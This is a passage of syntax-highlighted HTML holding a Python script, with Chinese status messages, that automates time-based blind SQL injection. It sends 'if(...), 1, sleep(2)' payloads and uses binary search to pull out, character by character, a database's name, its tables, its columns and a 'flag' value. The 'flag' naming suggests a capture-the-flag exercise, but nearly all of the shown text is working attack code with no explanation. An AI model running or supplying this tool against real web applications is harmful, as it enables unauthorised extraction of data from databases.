if(ascii(substr(database(), "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_equal<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                id_bigger <span class="token operator">=</span> <span class="token string">"1 and if(ascii(substr(database(), "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) > "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_bigger<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text                <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                    r <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">-</span> <span class="token number">1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    l <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                database <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"目前已知数据库名"</span><span class="token punctuation">,</span> database<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据库名为"</span><span class="token punctuation">,</span> database<span class="token punctuation">)</span>    <span class="token keyword">return</span> database<span class="token keyword">def</span> <span class="token function">get_table_num</span><span class="token punctuation">(</span>database<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers    num <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if((select count(table_name) from information_schema.tables where table_schema = '"</span> <span class="token operator">+</span> database <span class="token operator">+</span> <span class="token string">"') = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            num <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据库中有"</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> <span class="token string">"个表"</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> num<span class="token keyword">def</span> <span class="token function">get_table_length</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> database<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers    length <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if((select length(table_name) from information_schema.tables where table_schema = '"</span> <span class="token operator">+</span> database <span class="token operator">+</span> <span class="token string">"' limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"table length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"failed!"</span><span class="token punctuation">)</span>            length<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"table length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表名的长度为"</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>    <span class="token keyword">return</span> length<span class="token keyword">def</span> <span class="token function">get_table</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> table_length<span class="token punctuation">,</span> database<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers    table <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> table_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        l<span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span> <span class="token comment">#神奇的申明方法</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">ascii</span> <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            id_equal <span class="token operator">=</span> <span class="token string">"1 and if((select ascii(substr(table_name, "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) from information_schema.tables where table_schema = '"</span> <span class="token operator">+</span> database <span class="token operator">+</span> <span class="token string">"' limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_equal<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                id_bigger <span class="token operator">=</span> <span class="token string">"1 and if((select ascii(substr(table_name, "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) from information_schema.tables where table_schema = '"</span> <span class="token operator">+</span> database <span class="token operator">+</span> <span class="token string">"' limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1) > "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_bigger<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text                <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                    r <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">-</span> <span class="token number">1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    l <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                table <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"目前已知数据库名"</span><span class="token punctuation">,</span> table<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表名为"</span><span class="token punctuation">,</span> table<span class="token punctuation">)</span>    <span class="token keyword">return</span> table<span class="token keyword">def</span> <span class="token function">get_column_num</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers    num <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if((select count(column_name) from information_schema.columns where table_name = '"</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">"') = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            num <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"中有"</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> <span class="token string">"个字段"</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> num<span class="token keyword">def</span> <span class="token function">get_column_length</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers    length <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if((select length(column_name) from information_schema.columns where table_name = '"</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">"' limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"column length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"failed!"</span><span class="token punctuation">)</span>            length<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"column length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"第"</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"个字段的长度为"</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>    <span class="token keyword">return</span> length<span class="token keyword">def</span> <span class="token function">get_column</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> column_length<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers    column <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> column_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        l<span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span> <span class="token comment">#神奇的申明方法</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">ascii</span> <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            id_equal <span class="token operator">=</span> <span class="token string">"1 and if((select ascii(substr(column_name, "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) from information_schema.columns where table_name = '"</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">"' limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_equal<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                id_bigger <span class="token operator">=</span> <span class="token string">"1 and if((select ascii(substr(column_name, "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) from information_schema.columns where table_name = '"</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">"' limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1) > "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_bigger<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text                <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                    r <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">-</span> <span class="token number">1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    l <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                column <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"目前已知字段为"</span><span class="token punctuation">,</span> column<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"第"</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"个字段名为"</span><span class="token punctuation">,</span> column<span class="token punctuation">)</span>    <span class="token keyword">return</span> column<span class="token keyword">def</span> <span class="token function">get_flag_num</span><span class="token punctuation">(</span>column<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers    num <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if((select count("</span> <span class="token operator">+</span> column <span class="token operator">+</span> <span class="token string">") from "</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">") = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            num <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"中有"</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> <span class="token string">"行数据"</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> num<span class="token keyword">def</span> <span class="token function">get_flag_length</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> column<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers    length <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if((select length("</span> <span class="token operator">+</span> column <span class="token operator">+</span> <span class="token string">") from "</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">" limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"failed!"</span><span class="token punctuation">)</span>            length<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"第"</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"行数据的长度为"</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>    <span class="token keyword">return</span> length<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> flag_length<span class="token punctuation">,</span> column<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers    flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> flag_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        l<span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span> <span class="token comment">#神奇的申明方法</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">ascii</span> <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            id_equal <span class="token operator">=</span> <span class="token string">"1 and if((select ascii(substr("</span> <span class="token operator">+</span> column <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) from "</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">" limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_equal<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                id_bigger <span class="token operator">=</span> <span class="token string">"1 and if((select ascii(substr("</span> <span class="token operator">+</span> column <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) from "</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">" limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1) > "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_bigger<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text                <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                    r <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">-</span> <span class="token number">1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    l <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"目前已知flag为"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"第"</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"行数据为"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span>    <span class="token keyword">return</span> flag<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据库名长度"</span><span class="token punctuation">)</span>    database_length <span class="token operator">=</span> get_database_length<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据库名"</span><span class="token punctuation">)</span>    database <span class="token operator">=</span> get_database<span class="token punctuation">(</span>database_length<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据表的个数"</span><span class="token punctuation">)</span>    table_num <span class="token operator">=</span> get_table_num<span class="token punctuation">(</span>database<span class="token punctuation">)</span>    tables <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token 